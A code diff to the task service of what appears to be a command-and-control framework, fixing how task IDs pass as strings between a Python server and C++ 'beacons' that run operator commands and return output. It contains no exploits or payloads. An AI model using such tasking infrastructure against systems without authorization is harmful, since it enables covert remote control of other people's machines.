@@ -58,11 +58,11 @@ class GrimoireTaskService:
             task.assigned_at = datetime.utcnow()
             db.add(task)
 
-            print(f"[{beacon_id[:8]}]: Assigning Task {task.id} ({task.command})")
+            print(f"[{beacon_id[:8]}]: Assigning Task {task.task_id} ({task.command})")
 
             # 返回一个字典结构，方便 Beacon 端解析
             return {
-                "task_id": task.task_id,
+                "task_id": str(task.task_id),       # cpp端只能解析字符串，所以得适配一下
                 "command": task.command,
                 "arguments": task.arguments
             }
@@ -114,11 +114,11 @@ class GrimoireTaskService:
 
         try:
             # 解析 Beacon 回传的 JSON 数据
-            # Beacon 回传的 JSON 格式为: {"task_id": 123, "output": "..."}
+            # Beacon 回传的 JSON 格式为: {"task_id": "123", "output": "..."}
             beacon_data: Dict[str, Any] = json.loads(plaintext_bytes.decode('utf-8'))
 
             if 'task_id' in beacon_data and 'output' in beacon_data:
-                task_id = beacon_data['task_id']
+                task_id = int(beacon_data['task_id'])   #得先转到整形，cpp比较死板，python端改
 
                 # 这里的output在beacon是base64编码过的，到时候前端取出来的时候再解码
                 output_str = beacon_data['output']
